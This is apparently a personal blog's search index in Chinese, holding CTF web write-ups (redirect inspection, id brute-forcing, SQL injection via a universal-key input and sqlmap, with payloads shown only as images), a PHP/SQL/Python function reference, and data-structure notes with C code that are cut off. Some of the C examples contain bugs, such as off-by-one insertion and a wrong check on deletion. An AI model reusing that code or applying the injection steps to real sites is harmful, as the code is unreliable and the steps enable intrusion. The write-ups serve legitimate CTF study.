<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>web攻防</title>
    <url>/2022/08/15/web%E6%94%BB%E9%98%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>实例</p>
<span id="more"></span>
<h2 id="第一题——baby-web"><a href="#第一题——baby-web" class="headerlink" title="第一题——baby_web"></a>第一题——baby_web</h2><p>掌握web相应包头部常见参数</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101339517.png" alt="题目"></p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101408887.png" alt="打开后的图片"></p>
<p>根据题目描述考虑index.php页面，但是打开网页后直接跳转到了1.php，抓包得到</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101555331.png" alt></p>
<p>扔到reperter模块，修改1.php为index.php</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101647686.png" alt></p>
<p>看到旗帜被隐藏，看hex得到</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101726805.png" alt></p>
<p>或者通过开发者工具，在网络中可以看到index被重定向了<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815120359827.png" alt></p>
<h2 id="第二题——ics-06"><a href="#第二题——ics-06" class="headerlink" title="第二题——ics-06"></a>第二题——ics-06</h2><p>id爆破</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103134706.png" alt="题目"></p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103201798.png" alt="靶场"></p>
<p>点击很多个地方发现只有报表中心能点，里面内容为</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103310739.png" alt></p>
<p>选了很多个日期发现没反应网页，后来发现改id是有反应的<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103352596.png" alt><br>明白了，爆破，先抓包再送去炸死这道阴间题<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103500026.png" alt></p>
<p>然后我就一百个数一百个数进行爆破，在2300-2400的时候报文长度不一样了<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103556967.png" alt><br>看结果获得旗帜<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103629272.png" alt></p>
<h2 id="第三题——ingnt"><a href="#第三题——ingnt" class="headerlink" title="第三题——ingnt"></a>第三题——ingnt</h2><p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115158896.png" alt="题目"></p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115217584.png" alt="靶场"></p>
<p>没有什么可操作的地方除了地址框，猜测是sql注入<br>方法1：直接采用万能钥匙<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115337825.png" alt></p>
<p>方法二：sqlmap一把梭<br>先查数据库名<img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115419759.png" alt="image-20220815115419759"><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115447014.png" alt><br>查表名<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115506861.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115521175.png" alt><br>输出表中所有字段<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115600014.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115612711.png" alt><br>输出pw字段内容<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115639962.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115652969.png" alt><br>得到flag</p>
<p>直接一把梭<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115726708.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115746924.png" alt></p>
]]></content>
      <categories>
        <category>实例</category>
      </categories>
  </entry>
  <entry>
    <title>函数库</title>
    <url>/2022/08/18/%E5%87%BD%E6%95%B0%E5%BA%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>学习过程中遇到的一些不认识的函数的学习积累</p>
<span id="more"></span>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">格式<span class="number">1</span>：limit<span class="operator">&lt;</span>参数值<span class="operator">&gt;</span></span><br><span class="line">查询前<span class="operator">&lt;</span>参数值<span class="operator">&gt;</span>行的数据</span><br><span class="line"></span><br><span class="line">格式<span class="number">2</span>：limit<span class="operator">&lt;</span>参数值a<span class="operator">&gt;</span>,<span class="operator">&lt;</span>参数值b<span class="operator">&gt;</span></span><br><span class="line">查询从第<span class="operator">&lt;</span>参数值a<span class="operator">&gt;</span>行开始共<span class="operator">&lt;</span>参数值b<span class="operator">&gt;</span>条的数据</span><br></pre></td></tr></table></figure>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">获取图像大小及相关信息，成功返回一个数组，失败返回false并产生一条E_WARNING级错误信息</span><br><span class="line">其输出的数组为：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] <span class="operator">=</span>&gt; <span class="number">290</span></span><br><span class="line">    [<span class="number">1</span>] <span class="operator">=</span>&gt; <span class="number">69</span></span><br><span class="line">    [<span class="number">2</span>] <span class="operator">=</span>&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] <span class="operator">=</span>&gt; width<span class="operator">=</span><span class="string">&quot;290&quot;</span> height<span class="operator">=</span><span class="string">&quot;69&quot;</span></span><br><span class="line">    [bits] <span class="operator">=</span>&gt; <span class="number">8</span></span><br><span class="line">    [mime] <span class="operator">=</span>&gt; image/png</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">返回结果说明</span><br><span class="line"></span><br><span class="line">索引 <span class="number">0</span> 给出的是图像宽度的像素值</span><br><span class="line">索引 <span class="number">1</span> 给出的是图像高度的像素值</span><br><span class="line">索引 <span class="number">2</span> 给出的是图像的类型，返回的是数字，其中<span class="number">1</span> <span class="operator">=</span> GIF，<span class="number">2</span> <span class="operator">=</span> JPG，<span class="number">3</span> <span class="operator">=</span> PNG，<span class="number">4</span> <span class="operator">=</span> SWF，<span class="number">5</span> <span class="operator">=</span> PSD，<span class="number">6</span> <span class="operator">=</span> BMP，<span class="number">7</span> <span class="operator">=</span> TIFF(intel byte order)，<span class="number">8</span> <span class="operator">=</span> TIFF(motorola byte order)，<span class="number">9</span> <span class="operator">=</span> JPC，<span class="number">10</span> <span class="operator">=</span> JP2，<span class="number">11</span> <span class="operator">=</span> JPX，<span class="number">12</span> <span class="operator">=</span> JB2，<span class="number">13</span> <span class="operator">=</span> SWC，<span class="number">14</span> <span class="operator">=</span> IFF，<span class="number">15</span> <span class="operator">=</span> WBMP，<span class="number">16</span> <span class="operator">=</span> XBM</span><br><span class="line">索引 <span class="number">3</span> 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image&gt; 标签</span><br><span class="line">索引 bits 给出的是图像的每种颜色的位数，二进制格式</span><br><span class="line">索引 channels 给出的是图像的通道值，RGB 图像默认是 <span class="number">3</span></span><br><span class="line">索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(<span class="string">&quot;Content-type: image/jpeg&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<h3 id="strrpos"><a href="#strrpos" class="headerlink" title="strrpos"></a>strrpos</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strrpos</span>(<span class="keyword">string</span>,find,start)</span><br><span class="line"><span class="number">1</span>.<span class="keyword">string</span>：必需。规定被搜索的字符串。</span><br><span class="line"><span class="number">2</span>.find：必需。规定要查找的字符。</span><br><span class="line"><span class="number">3</span>.start：可选。规定在何处开始搜索。</span><br><span class="line">    </span><br><span class="line">相关函数：</span><br><span class="line">    <span class="title function_ invoke__">stripos</span>()-查找字符串在另一字符串中第一次出现的位置（不区分大小写）</span><br><span class="line">    <span class="title function_ invoke__">strpos</span>()-查找字符串在另一字符串中第一次出现的位置（区分大小写）</span><br><span class="line">    <span class="title function_ invoke__">strripos</span>()-查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</span><br></pre></td></tr></table></figure>
<h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">格式<span class="number">1</span>：<span class="title function_ invoke__">substr</span>(<span class="keyword">string</span>,<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span><br><span class="line">    <span class="number">1</span>、<span class="keyword">string</span> 需要截取的字符串 </span><br><span class="line">    <span class="number">2</span>、a 截取字符串的开始位置（注：当a等于<span class="number">0</span>或<span class="number">1</span>时，都是从第一位开始截取）</span><br><span class="line">    <span class="number">3</span>、b 要截取的字符串的长度</span><br><span class="line"></span><br><span class="line">格式<span class="number">2</span>：<span class="title function_ invoke__">substr</span>(<span class="keyword">string</span>,<span class="keyword">int</span> a)</span><br><span class="line">    <span class="number">1</span>、<span class="keyword">string</span> 需要截取的字符串</span><br><span class="line">    <span class="number">2</span>、a 可以理解为从第a个字符开始截取后面所有的字符串。</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,<span class="number">1</span>,<span class="number">3</span>); <span class="comment">//返回结果：aka</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>); <span class="comment">//返回结果：kal，截取从“e”开始3个字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,<span class="number">0</span>,<span class="number">100</span>); <span class="comment">//返回结果：akali，100虽然超出预处理的字符串最长度，但不会影响返回结果，系统按预处理字符串最大数量返回。</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali !&#x27;</span>,<span class="number">5</span>,<span class="number">3</span>); <span class="comment">//返回结果：i ! (中间的空格也算一个字符串)</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,-<span class="number">1</span>,<span class="number">3</span>); <span class="comment">//返回结果：i （从后面倒数第一位开始往后取1个字符，而不是3个。）</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,-<span class="number">2</span>,<span class="number">3</span>); <span class="comment">//返回结果：li （从后面倒数第二位开始往后取2个字符，而不是3个。原因：下面红色 第三个注解）</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,-<span class="number">3</span>,<span class="number">3</span>); <span class="comment">//返回结果：ali （从后面倒数第三位开始往后取3个字符）</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,-<span class="number">4</span>,<span class="number">3</span>); <span class="comment">//返回结果：ali （从后面倒数第四位开始往后取3个字符）</span></span><br><span class="line"></span><br><span class="line">注：最后几个奇奇怪怪的原因是要满足下面规则：</span><br><span class="line">|a| ≤ b,取a的个数；当 |a| ≥ b时，才取b的个数，由a决定截取位置）</span><br><span class="line"></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,<span class="number">1</span>);  <span class="comment">//返回结果： akali，截取所有字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,<span class="number">2</span>);  <span class="comment">//返回结果：kali，截取从“k”开始之后所有字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,<span class="number">3</span>);  <span class="comment">//返回结果：ali，截取从“a”开始之后所有字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,-<span class="number">1</span>);  <span class="comment">//返回结果：i，从最后一个“i”开始，反向截取1个字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,-<span class="number">2</span>);  <span class="comment">//返回结果：li，从最后一个“i”开始，反向截取2个字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,-<span class="number">3</span>);  <span class="comment">//返回结果：ali，从最后一个“i”开始，反向截取3个字符 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>语法：map(function, iterable, …)<br>参数：function — 函数    iterable — 一个或多个序列</p>
<h3 id="round"><a href="#round" class="headerlink" title="round"></a>round</h3><p>语法：round( x [, n]  )<br>参数：</p>
<ul>
<li>x — 数值表达式。</li>
<li>n — 数值表达式，表示从小数点位数。</li>
</ul>
<p>返回值：返回浮点数x的四舍五入值。</p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构总纲</title>
    <url>/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>数据结构所有知识点汇总<br><span id="more"></span></p>
<h1 id="第零章——相关知识"><a href="#第零章——相关知识" class="headerlink" title="第零章——相关知识"></a>第零章——相关知识</h1><h2 id="卡特兰数"><a href="#卡特兰数" class="headerlink" title="卡特兰数"></a>卡特兰数</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220916175036035.png" alt></p>
<h1 id="第一章——绪论"><a href="#第一章——绪论" class="headerlink" title="第一章——绪论"></a>第一章——绪论</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>数据：信息的载体，被<strong>计算机程序识别和处理</strong>的符号的集合</p>
<p>数据元素：数据的<strong>基本单位</strong>，作为一个整体进行考虑和处理。可由若干<strong>数据项</strong>组成，数据项时构成数据元素的不可分割的<strong>最小单位</strong></p>
<p>组合项：由更细分的属性组成的数据项</p>
<p>数据对象：具有<strong>相同性质的数据元素的集合</strong>，是数据的一个子集</p>
<p>数据结构：相互之间存在一种或多种特定关系的数据元素的集合</p>
<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>对特定问题求解步骤的一种描述</p>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>​           有穷性：算法是有穷的，程序可以是无穷的（死循环不是算法）</p>
<p>​           确定性：相同的输入只能得到相同的输出</p>
<p>​           可行性</p>
<p>​           输入：0个或多个</p>
<p>​           输出：1个或多个</p>
<h3 id="好算法的特质"><a href="#好算法的特质" class="headerlink" title="好算法的特质"></a>好算法的特质</h3><p>​            正确性</p>
<p>​            可读性</p>
<p>​            健壮性：输入非法数据时，能适当作出反应进行处理</p>
<p>​            高效率，低存储需求：时间空间复杂度低</p>
<h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><p>常对幂指阶</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220916175113938.png" alt></p>
<p>考虑数量级</p>
<script type="math/tex; mode=display">
T(n)=O(f(n)) \Leftrightarrow \lim\limits_{n\rightarrow\infty}\frac{T(n)}{f(n)}</script><p>加法</p>
<script type="math/tex; mode=display">
T(n)=T_1(n)+T_2(n)=O(f(n))+O(g(n))=O(max(f(n),g(n))</script><p>乘法</p>
<script type="math/tex; mode=display">
T(n)=T_1(n)*T_2(n)=O(f(n))*O(g(n))=O(f(n)*g(n))</script><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>越高级的语言执行效率越低</p>
<h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p>函数递归调用带来的内存开销，递归调用深度x与问题规模n的关系：x=f（n）</p>
<h3 id="数据结构三要素"><a href="#数据结构三要素" class="headerlink" title="数据结构三要素"></a>数据结构三要素</h3><p>逻辑结构        数据运算        存储结构</p>
<h4 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520173636636.png" alt="image-20220520173636636" style="zoom: 80%;"></p>
<p>集合：数据元素同属于一个集合，没有其他关系</p>
<p>线性结构  ：只存在一对一的关系</p>
<p>树形结构  ：存在一对多的关系</p>
<p>网状结构或图状结构：存在多对多的关系</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520173714417.png" alt="image-20220520173714417" style="zoom:80%;"></p>
<h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><p>1）顺序存储：逻辑上相邻物理上也相邻</p>
<p>2）链式存储：借助指针来表示元素之间的逻辑关系</p>
<p>3）索引存储：建立附加的索引表，索引项的一般形式（关键字，地址）</p>
<p>4）散列存储：哈希存储，根据元素的关键字</p>
<h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>1.可以用（）定义一个完整的数据结构                  <strong>D</strong></p>
<p>   A.数据元素    B.数据对象    C.数据关系    D.抽象数据结构</p>
<p>2.数据结构的说法中，正确的（）                        <strong>A</strong></p>
<p>​    A.数据的逻辑结构独立于其存储结构       </p>
<p>​    B.数据的存储结构独立于其逻辑结构                //存储结构是逻辑结构在计算机上的映射</p>
<p>​    C.数据的逻辑结构唯一决定其存储结构</p>
<p>​    D.数据结构仅由其逻辑结构和存储结构决定</p>
<p>3.<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520173954229.png" alt="image-20220520173954229">                <strong>A</strong></p>
<p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520174012046.png" alt="image-20220520174012046"></p>
<p>4.<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520174334183.png" alt="image-20220520174334183"></p>
<p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520174402447.png" alt="image-20220520174402447"></p>
<p>5.算法原地工作的含义是指算法所需的辅助空间是常量。</p>
<p>   时间复杂度总是考虑最坏情况下的时间复杂度，以保证算法的运行时间不会比它更长。</p>
<p>7.<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520182104382.png" alt="image-20220520182104382"></p>
<p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520182039190.png" alt="image-20220520182039190"></p>
<h1 id="第二章——线性表"><a href="#第二章——线性表" class="headerlink" title="第二章——线性表"></a>第二章——线性表</h1><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p>是一个<strong>有限</strong>序列=&gt;有次序  （所以整数按照递增排列，不是线性表）</p>
<p>直接前驱 </p>
<script type="math/tex; mode=display">
a_1 \leftarrow a_2</script><p>a1是a2的直接前驱</p>
<p>直接后继</p>
<script type="math/tex; mode=display">
a_1 \rightarrow a_2</script><p>a2是a1的直接后继</p>
<h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>引用型参数：需要对参数的修改结果需要带回来</p>
<h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><p>用顺序存储的方式实现线性表——把逻辑上相邻的元素存储在物理位置也相邻的存储单元</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220416212202152.png" alt="image-20220416212202152"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220416212232241.png" alt="image-20220416212232241"></p>
<h3 id="静态存储"><a href="#静态存储" class="headerlink" title="静态存储"></a>静态存储</h3><p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10   <span class="comment">//定义最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];   <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;   <span class="comment">//顺序表当前元素长度</span></span><br><span class="line">&#125;SqList;   <span class="comment">//顺序表类型定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)</span><br><span class="line">		L.data[i]=<span class="number">0</span>;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;L.data[%d]=%d\n&quot;</span>,i,L.data[i]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220415214246742.png" alt="image-20220415214246742"></p>
<p><strong>正常访问应该是i&lt;L.length，并且Length = 0是不可省略的</strong></p>
<h3 id="动态存储"><a href="#动态存储" class="headerlink" title="动态存储"></a>动态存储</h3><p>malloc函数用于申请空间</p>
<p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> initsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> *data;  <span class="comment">//指示动态分配数组的指针</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的当前长度</span></span><br><span class="line">	<span class="type">int</span> maxsize;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initlist</span><span class="params">(sqlist &amp;L)</span>&#123;</span><br><span class="line">	L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>(initsize*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	L.length = <span class="number">0</span>;</span><br><span class="line">	L.maxsize = initsize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//增加表长</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">increaselist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">	<span class="type">int</span> *p = L.data;</span><br><span class="line">	L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>((L.maxsize+len)*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">		L.data[i] = p[i];</span><br><span class="line">	&#125;</span><br><span class="line">	L.maxsize = L.maxsize+len;</span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	initlist(L);</span><br><span class="line">	increaselist(L,<span class="number">5</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220416211821527.png" alt="image-20220416211821527"></p>
<p>realloc函数也可以实现上述过程</p>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220416213252923.png" alt="image-20220416213252923"></p>
<p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[maxsize];  <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">insertlist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>)  <span class="comment">//判断i的范围是否有效</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>(L.length&gt;maxsize)  <span class="comment">//判断数组是否已满</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=L.length;j&gt;=i;j--)</span><br><span class="line">		L.data[j]=L.data[j<span class="number">-1</span>];</span><br><span class="line">	L.data[i]=e;</span><br><span class="line">	L.length++;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	insertlist(L,<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>插入操作的时间复杂度</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220416214334739.png" alt="image-20220416214334739"></p>
<p>平均循环复杂度  =  O(n)</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[maxsize];  <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">deletelist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(e&lt;i||e&gt;L.length)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;=L.length;j++)</span><br><span class="line">		L.data[j<span class="number">-1</span>]=L.data[j];</span><br><span class="line">	